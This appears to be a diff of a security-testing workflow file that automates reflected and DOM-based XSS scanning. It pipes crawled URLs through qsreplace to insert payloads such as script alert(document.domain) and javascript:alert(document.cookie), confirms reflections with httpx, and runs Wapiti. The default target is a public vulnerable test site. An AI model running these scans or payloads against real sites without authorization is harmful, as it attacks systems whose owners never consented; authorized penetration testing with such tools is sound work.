@@ -1,23 +1,42 @@
 description: Conducts an XSS security test by fetching URLs, filtering for those with query parameters, and replacing them with a test payload. Uses 'httpx' to request these URLs, identifying successful XSS injections by checking for a 200 status code and payload identifier. Also uses Wapiti for an automated scan.
 tags: xss, XSS
-params: target=testphp.vulnweb.com header="Example:Blackdagger"
-# Change header without blank if you need or add authorization
-env:
-  - HOME: /root/
-  - LOG_DIR: ${HOME}/logs
-  - PATH: /usr/local/bin:${PATH}
-steps:
-  - name: CustomXSS-External
-    command: bash
-    script: |
-      gau ${target} | grep -Ev "\.(jpeg|jpg|png|ico)$" | grep =  | qsreplace "\"><img src=x onerror=alert(12345654321)>" | httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"
+params: target=http://testphp.vulnweb.com header="Example:Blackdagger"
 
-  - name: CustomXSS-Internal
+steps:
+  - name: gau
+    command: gau $target
+    stdout: /tmp/gau_result.txt
+
+  - name: BasicXSS
     command: bash
     script: |
-      httpx -u $target | katana -H ${header} qurl | qsreplace "\"><img src=x onerror=alert(12345654321)>" | httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"
+      cat /tmp/gau_result.txt | grep -Ev "\.(jpeg|jpg|png|ico|css|pdf|svg|gif|ttf|woff|woff2)$" | grep = | qsreplace "'><script>alert(document.domain)</script>" | httpx -silent -mc 200 -mr "alert\(document\.domain\)"
+    depends:
+      - gau
 
   - name: AutoXSS
     command: bash
     script: |
-      ~/go/bin/httpx -u $target -o resXSS_${target}.txt ; wapiti -u "$(cat resXSS_${target}.txt)" -m xss -H ${header}
+      wapiti -u $target -m xss -H $header
+    depends:
+      - gau
+
+  - name: DOM-basedXSS
+    command: bash
+    script: |
+      cat /tmp/gau_result.txt | grep -E "\?|=" | qsreplace "javascript:alert(document.cookie)" | httpx -silent -mc 200 -mr "javascript\:alert\(document\.cookie\)"
+    depends:
+      - gau
+  - name: XSSwithEventHandler
+    command: bash
+    script: |
+      cat /tmp/gau_result.txt | grep = | qsreplace "\"><div onmouseover=\"alert(1)\">hover me</div>" | httpx -silent -mc 200 -mr "onmouseover\=\"alert\(1\)\""
+    depends:
+      - gau
+
+  - name: cleanup
+    command: rm /tmp/gau_result.txt
+    depends:
+      - BasicXSS
+      - DOM-basedXSS
+      - XSSwithEventHandler
